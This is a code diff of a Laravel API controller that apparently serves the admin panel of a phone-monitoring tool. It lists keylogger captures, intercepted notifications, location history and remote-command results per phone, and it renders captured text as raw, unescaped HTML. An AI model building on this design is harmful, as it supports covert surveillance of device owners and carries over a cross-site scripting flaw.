@@ -3,10 +3,16 @@
 namespace App\Http\Controllers\api;
 
 use App\Http\Controllers\Controller;
+use App\Models\Keylogger;
+use App\Models\Location;
+use App\Models\Notification;
 use App\Models\Phone;
 use App\Models\Remotecontrol;
 use App\Traits\ApiResponser;
+use Google\Service\Bigquery\AvroOptions;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
+use Yajra\DataTables\DataTables;
 
 class RemoteControlAPIController extends Controller
 {
@@ -18,81 +24,71 @@ class RemoteControlAPIController extends Controller
      */
     public function index()
     {
-        $phone_id = request('phone_id');
-        $data = Remotecontrol::where(compact('phone_id'))->orderBy('id', 'desc')->get();
-        $tab = [];
+        $user = Auth::user();
+        abort_if(!in_array($user->user_role, ['admin']), 403, "No permission");
 
-        foreach ($data as $el) {
-            $o = (object) [];
-            $o->id = $el->id;
-            $o->action = $el->action;
-            $st = $el->fetched;
-            if ($st == 0) {
-                $o->status = "En attente";
-            } elseif ($el->success) {
-                $o->status = "OK";
-            } else {
-                $o->status = "Echec";
+        if ($user->user_role == 'admin') {
+            $phone_id = request('phone_id');
+            $type = request('type');
+            if ($type == 'result') {
+                $data = Remotecontrol::where(compact('phone_id'));
+                return DataTables::of($data)
+                    ->rawColumns(['success', 'result'])
+                    ->editColumn('result', function ($row) {
+                        $href = asset('storage/' . $row->result);
+                        $n = explode('/', $row->result);
+                        $n = end($n);
+                        return "<a href='$href' target='_blank'>$n</a>";
+                    })
+                    ->editColumn('success', function ($row) {
+                        $st = $row->fetched;
+                        if ($st == 0) {
+                            $status = "<span class='badge bg-warning'><i class='fa fa-spinner fa-spin'></i> En attente</span>";
+                        } elseif ($row->success) {
+                            $status = "<span class='badge bg-success'><i class='fa fa-check-circle'></i> OK</span>";
+                        } else {
+                            $status = "<span class='badge bg-danger'><i class='fa fa-exclamation-circle'></i> Echec</span>";
+                        }
+                        return $status;
+                    })->editColumn('date', function ($row) {
+                        return $row->date->format('d-m-Y H:i:s');
+                    })
+                    ->make(true);
             }
-            $o->date = $el->date->format('d-m-Y H:i:s');
-            $o->fetchedon = $el->fetchedon?->format('d-m-Y H:i:s') ?? '-';
-            $o->errormessage = $el->errormessage;
-            $r = $el->result;
-            if ($r) {
-                $hr = asset('storage/' . $r);
-                $r0 = explode('/', $r);
-                $r0 = end($r0);
-                $o->result = "<a href='$hr' target='_blank'> $r0</a>";
-            } else {
-                $o->result = '';
+
+            if ($type == 'notif') {
+                $data = Notification::where(compact('phone_id'));
+                return DataTables::of($data)
+                    ->editColumn('date', function ($row) {
+                        return $row->date->format('d-m-Y H:i:s');
+                    })
+                    ->make(true);
             }
-            $tab[] = $o;
+
+            if ($type == 'keylog') {
+                $data = Keylogger::where(compact('phone_id'));
+                return DataTables::of($data)
+                    ->rawColumns(['text'])
+                    ->editColumn('date', function ($row) {
+                        return $row->date->format('d-m-Y H:i:s');
+                    })
+                    ->editColumn('text', function ($row) {
+                        return str_replace("#781227#", "<br><br>", $row->text);
+                    })
+                    ->make(true);
+            }
+
+            if ($type == 'location') {
+                $data = Location::where(compact('phone_id'))->orderBy('id', 'desc')->get()->map(function ($e) {
+                    $o = (object) $e->toArray();
+                    $o->date = $e->date?->format('d-m-Y H:i:s');
+                    return $o;
+                });
+                return $data;
+            }
+
+            abort(403);
         }
-
-        $phones = [];
-        $dt = Phone::orderBy('updatedon', 'desc')->with([
-            'apps' => function ($query) {
-                $query->orderBy('id', 'desc');
-            },
-            'calls' => function ($query) {
-                $query->orderBy('id', 'desc');
-            },
-            'locations' => function ($query) {
-                $query->orderBy('id', 'desc');
-            },
-            'notifications' => function ($query) {
-                $query->orderBy('id', 'desc');
-            },
-            'keyloggers' => function ($query) {
-                $query->orderBy('id', 'desc');
-            },
-        ])->get();
-
-        foreach ($dt as $el) {
-            $obj = (object) $el->toArray();
-            $obj->data = json_decode($el->data);
-            $obj->updatedon = $el->updatedon?->format('d-m-Y H:i:s');
-            $obj->perms = json_decode($el->perms);
-            $obj->fcmok = (bool) $el->fcm;
-            unset($obj->fcm);
-            $phones[] = $obj;
-        }
-
-        $apps = [];
-        foreach (Phone::orderBy('updatedon', 'desc')->get() as $el) {
-            $apps[] = (object)[
-                'id' => $el->id,
-                'phone' => $el->phone,
-                'data' => json_decode($el->data),
-                'updatedon' => $el->updatedon?->format('d-m-Y H:i:s'),
-                'perms' => json_decode($el->perms),
-            ];
-        }
-
-        $data = [];
-        $data['phones'] = $phones;
-        $data['actions'] = $tab;
-        return $data;
     }
 
     /**
